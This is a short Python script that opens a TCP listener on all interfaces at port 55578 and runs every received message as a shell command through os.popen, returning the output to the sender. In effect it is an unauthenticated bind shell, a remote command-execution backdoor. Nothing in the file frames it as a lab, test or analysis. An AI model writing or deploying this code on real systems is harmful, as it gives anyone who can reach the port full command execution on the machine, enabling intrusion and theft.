# !/usr/bin/python
import socket, os
s = socket.socket()
s.bind(('0.0.0.0', 55578))
s.listen(5)
while True:
    c, addr = s.accept()
    print('Get connection forom ' + addr[0])
    command = c.recv(1024)
    c.send(os.popen(command).read())